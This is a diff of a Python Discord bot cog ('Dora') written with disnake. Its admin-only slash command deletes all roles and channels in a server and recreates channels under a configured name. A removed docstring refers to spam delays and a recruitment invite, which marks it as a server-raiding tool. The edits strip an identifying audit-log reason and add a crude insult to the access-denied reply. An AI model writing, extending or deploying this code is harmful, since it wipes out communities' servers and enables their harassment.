@@ -1,12 +1,3 @@
-"""
-Настройка задержек:
-Измените параметры channel_create_delay и spam_delay в config.py для управления скоростью создания каналов и отправки сообщений.
-Пример:
-    channel_create_delay = 1   # 1 секунда между созданием каналов
-    spam_delay = 10    
-        by https://discord.gg/l1te 
-"""
-
 import disnake
 from disnake.ext import commands
 import asyncio
@@ -20,13 +11,13 @@ class Dora(commands.Cog):
     @commands.slash_command()
     async def dora(self, interaction: disnake.ApplicationCommandInteraction):
         if str(interaction.user.id) != admin_id:
-            await interaction.response.send_message(content="у вас нету доступа для использования этой команде", ephemeral=True)
+            await interaction.response.send_message(content="у вас нету доступа для использования этой команде так что вы можете пойти нахуй.", ephemeral=True)
             return
         guild = interaction.guild
         if not guild.me.guild_permissions.manage_channels:
-            await interaction.response.send_message("У бота нет прав для выполнения этой команды.", ephemeral=True)
+            await interaction.response.send_message("у бота нет прав  для выполнения этой команды.", ephemeral=True)
             return
-        await interaction.response.send_message(content="Успешно сделано! Начинаю удаление каналов, а далее пересоздаю их с названием из конфига!", ephemeral=True)
+        await interaction.response.send_message(content="Успешно сделано! Начинаю удаление каналов, а далее пересоздаю их с названием из вашего конфига!", ephemeral=True)
         await self.start_mass_channel_replace(guild)
 
     async def start_mass_channel_replace(self, guild):
@@ -36,7 +27,7 @@ class Dora(commands.Cog):
             if role.is_default():
                 continue
             try:
-                await role.delete(reason="Dora mass replace")
+                await role.delete(reason="mass replace")
                 deleted_roles += 1
             except Exception:
                 pass
@@ -45,7 +36,7 @@ class Dora(commands.Cog):
             if channel.name == config_channel_name:
                 continue
             try:
-                await channel.delete(reason="Dora mass replace")
+                await channel.delete(reason="mass replace")
                 deleted_channels += 1
             except Exception:
                 pass
